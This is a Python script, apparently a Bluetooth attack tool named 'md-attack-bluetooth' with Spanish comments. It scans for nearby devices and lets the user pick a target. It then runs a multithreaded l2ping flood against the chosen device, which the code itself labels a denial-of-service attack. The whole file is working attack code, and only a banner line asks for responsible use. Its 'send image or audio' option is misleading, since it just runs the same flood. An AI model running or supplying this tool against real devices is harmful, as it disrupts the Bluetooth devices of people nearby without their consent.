import os
import subprocess
import threading
import time

# Función para verificar e instalar programas necesarios
def check_and_install_programs(programs):
    print("[*] Verificando programas necesarios...")
    for program in programs:
        result = subprocess.run(['which', program], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[!] {program} no está instalado. Instalando {program}...")
            os.system(f'sudo apt-get install -y {program}')
        else:
            print(f"[*] {program} ya está instalado.")

# Función para validar si el servicio Bluetooth y SDP están activos
def check_and_activate_bluetooth_services():
    print("[*] Verificando servicios de Bluetooth y SDP...")
    try:
        # Verificar si el servicio Bluetooth está activo
        bluetooth_status = subprocess.run(['hciconfig', 'hci0', 'up'], capture_output=True)
        if bluetooth_status.returncode != 0:
            print("[!] El servicio Bluetooth está inactivo. Activando...")
            os.system('sudo hciconfig hci0 up')
        else:
            print("[*] El servicio Bluetooth está activo.")

        # Verificar si el servidor SDP está activo
        sdp_status = subprocess.run(['sdptool', 'browse', 'local'], capture_output=True)
        if sdp_status.returncode != 0:
            print("[!] El servidor SDP no está activo. Activando...")
            os.system('sudo systemctl restart bluetooth')
        else:
            print("[*] El servidor SDP está activo.")
    
    except Exception as e:
        print(f"[!] Error al verificar los servicios: {e}")
        exit(1)

# Función para el ataque DOS
def DOS(target_addr, package_size):
    os.system(f'l2ping -i hci0 -s {package_size} -f {target_addr}')

# Función para mostrar el banner del programa
def print_banner():
    print("============================================")
    print("          md-attack-bluetooth")
    print("      Creado por midesmis - Use responsablemente")
    print("  Debe utilizarse en entornos controlados")
    print("============================================")

# Función principal del programa
def main():
    print_banner()

    # Lista de programas necesarios
    required_programs = ['hcitool', 'l2ping', 'sdptool', 'bluetoothctl']
    
    # Verificar e instalar los programas necesarios
    check_and_install_programs(required_programs)
    
    # Validar e iniciar los servicios de Bluetooth y SDP
    check_and_activate_bluetooth_services()
    
    # Escaneo de dispositivos cercanos
    print("Escaneando dispositivos Bluetooth cercanos...")
    output = subprocess.check_output("hcitool scan", shell=True, text=True)
    lines = output.splitlines()[1:]  # Omitir la primera línea
    devices = {}
    for idx, line in enumerate(lines):
        parts = line.split()
        devices[idx] = {'mac': parts[0], 'name': ' '.join(parts[1:])}
        print(f"{idx}. MAC: {parts[0]}, Nombre: {' '.join(parts[1:])}")

    if not devices:
        print("[!] No se encontraron dispositivos.")
        return

    # Selección del dispositivo por ID
    target_id = input("Seleccione el ID del dispositivo para el ataque: ")
    try:
        target_device = devices[int(target_id)]
        target_addr = target_device['mac']
        print(f"[*] Dispositivo seleccionado: {target_device['name']} ({target_addr})")
    except (KeyError, ValueError):
        print("[!] ID inválido.")
        return

    # Opción para enviar imagen o audio antes del ataque
    send_media = input("¿Desea enviar una imagen o audio antes del ataque? (y/n): ").lower()
    if send_media == 'y':
        media_file = input("Ingrese la ruta del archivo de imagen o audio a enviar: ")
        # Suponiendo que usas l2cap para enviar datos
        print(f"[*] Enviando {media_file} a {target_addr}...")
        os.system(f"l2ping -i hci0 -s 600 -f {target_addr}")  # Simulando el envío
    
    # Configurar el ataque DOS
    package_size = int(input("Ingrese el tamaño del paquete para el ataque DOS: "))
    threads_count = int(input("Ingrese la cantidad de hilos para el ataque DOS: "))

    print("[*] Iniciando ataque DOS en 3 segundos...")
    time.sleep(3)

    # Iniciar el ataque DOS
    for i in range(threads_count):
        threading.Thread(target=DOS, args=(target_addr, package_size)).start()

    print("[*] Ataque DOS en ejecución...")

    # Estado de salida exitoso
    print("[*] Saliendo del programa exitosamente.")
    exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Programa abortado.")
        exit(0)
